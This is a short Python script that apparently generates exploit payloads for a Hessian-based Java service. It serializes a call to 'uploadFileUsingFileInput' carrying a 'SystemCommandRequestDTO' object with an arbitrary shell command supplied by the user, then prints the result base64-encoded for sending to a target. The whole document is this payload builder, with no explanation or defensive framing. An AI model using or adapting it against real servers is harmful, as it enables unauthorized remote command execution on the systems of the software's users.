#!/usr/bin/python3

from pyhessian.encoder import encode_object
from pyhessian.protocol import Call, object_factory
import typer, base64

app = typer.Typer(add_completion=False)


@app.command()
def main(cmd):
    dto = object_factory("com.mi.mics.dto.SystemCommandRequestDTO", command=cmd)

    print(base64.b64encode(encode_object(Call("uploadFileUsingFileInput", args=[dto, None], version=2))).decode())


if __name__ == "__main__":
    typer.run(app())
